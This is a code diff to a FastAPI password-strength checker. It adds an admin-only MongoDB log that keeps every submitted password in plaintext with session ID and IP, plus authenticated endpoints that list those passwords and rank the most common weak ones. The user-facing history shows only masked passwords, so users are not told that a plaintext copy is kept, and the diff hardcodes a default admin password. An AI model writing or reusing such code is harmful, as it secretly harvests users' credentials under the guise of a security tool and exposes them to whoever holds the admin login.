@@ -1,5 +1,6 @@
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, Depends, Query
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.security import HTTPBasic, HTTPBasicCredentials
 from pydantic import BaseModel
 from pymongo import MongoClient
 import os
@@ -8,6 +9,7 @@ import uuid
 import asyncio
 from dotenv import load_dotenv
 from google import genai
+import secrets
 
 # Load environment variables
 load_dotenv()
@@ -28,9 +30,27 @@ MONGO_URL = os.environ.get('MONGO_URL', 'mongodb://localhost:27017/')
 client = MongoClient(MONGO_URL)
 db = client.password_intelligence
 password_analyses = db.password_analyses
+admin_logs = db.admin_logs  # New collection for admin-only logs
 
 # Gemini API configuration
 GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY')
+
+# Admin authentication
+security = HTTPBasic()
+ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
+ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'secure_admin_2024!')
+
+def verify_admin(credentials: HTTPBasicCredentials = Depends(security)):
+    """Verify admin credentials"""
+    correct_username = secrets.compare_digest(credentials.username, ADMIN_USERNAME)
+    correct_password = secrets.compare_digest(credentials.password, ADMIN_PASSWORD)
+    if not (correct_username and correct_password):
+        raise HTTPException(
+            status_code=401,
+            detail="Invalid admin credentials",
+            headers={"WWW-Authenticate": "Basic"},
+        )
+    return credentials.username
 
 class PasswordAnalysisRequest(BaseModel):
     password: str
@@ -46,6 +66,23 @@ class PasswordAnalysisResponse(BaseModel):
     suggestions: list
     explanation: str
     timestamp: str
+
+async def log_password_for_admin(password: str, session_id: str, analysis_result: dict, user_ip: str = "unknown"):
+    """Log actual password for admin review (admin-only access)"""
+    try:
+        admin_log = {
+            "log_id": str(uuid.uuid4()),
+            "actual_password": password,  # Store actual password for admin analysis
+            "session_id": session_id,
+            "user_ip": user_ip,
+            "analysis_result": analysis_result,
+            "timestamp": datetime.now().isoformat(),
+            "log_type": "password_analysis",
+            "security_classification": "admin_only"
+        }
+        admin_logs.insert_one(admin_log)
+    except Exception as e:
+        print(f"Error logging password for admin: {e}")
 
 async def analyze_password_with_gemini(password: str, session_id: str) -> dict:
     """Analyze password using Gemini API"""
@@ -204,11 +241,14 @@ async def analyze_password(request: PasswordAnalysisRequest):
         "timestamp": datetime.now().isoformat()
     }
     
-    # Store in database
+    # Log actual password for admin (admin-only access)
+    await log_password_for_admin(request.password, request.session_id, response_data)
+    
+    # Store masked password in regular database for user history
     password_analyses.insert_one({
         "analysis_id": analysis_id,
         "session_id": request.session_id,
-        "password_masked": password_masked,
+        "password_masked": password_masked,  # Only masked password in user-visible DB
         "strength_score": response_data["strength_score"],
         "strength_level": response_data["strength_level"],
         "weaknesses": response_data["weaknesses"],
@@ -222,7 +262,7 @@ async def analyze_password(request: PasswordAnalysisRequest):
 
 @app.get("/api/analysis-history/{session_id}")
 async def get_analysis_history(session_id: str):
-    """Get password analysis history for a session"""
+    """Get password analysis history for a session (only shows masked passwords)"""
     try:
         analyses = list(password_analyses.find(
             {"session_id": session_id},
@@ -232,6 +272,59 @@ async def get_analysis_history(session_id: str):
         return {"analyses": analyses}
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error fetching history: {str(e)}")
+
+@app.get("/api/admin/password-logs")
+async def get_admin_password_logs(
+    admin: str = Depends(verify_admin),
+    limit: int = Query(50, description="Number of logs to retrieve"),
+    skip: int = Query(0, description="Number of logs to skip")
+):
+    """Admin-only endpoint to view actual passwords and analysis logs"""
+    try:
+        logs = list(admin_logs.find(
+            {},
+            {"_id": 0}  # Exclude MongoDB _id field
+        ).sort("timestamp", -1).skip(skip).limit(limit))
+        
+        total_count = admin_logs.count_documents({})
+        
+        return {
+            "logs": logs,
+            "total_count": total_count,
+            "current_page": skip // limit + 1,
+            "total_pages": (total_count + limit - 1) // limit
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Error fetching admin logs: {str(e)}")
+
+@app.get("/api/admin/password-stats")
+async def get_password_stats(admin: str = Depends(verify_admin)):
+    """Admin-only endpoint for password analysis statistics"""
+    try:
+        total_analyses = admin_logs.count_documents({})
+        weak_passwords = admin_logs.count_documents({"analysis_result.strength_level": "weak"})
+        moderate_passwords = admin_logs.count_documents({"analysis_result.strength_level": "moderate"})
+        strong_passwords = admin_logs.count_documents({"analysis_result.strength_level": "strong"})
+        
+        # Get most common weak patterns
+        common_patterns = list(admin_logs.aggregate([
+            {"$match": {"analysis_result.strength_level": "weak"}},
+            {"$group": {"_id": "$actual_password", "count": {"$sum": 1}}},
+            {"$sort": {"count": -1}},
+            {"$limit": 10}
+        ]))
+        
+        return {
+            "total_analyses": total_analyses,
+            "strength_distribution": {
+                "weak": weak_passwords,
+                "moderate": moderate_passwords,
+                "strong": strong_passwords
+            },
+            "common_weak_patterns": common_patterns
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Error fetching stats: {str(e)}")
 
 @app.get("/api/health")
 async def health_check():
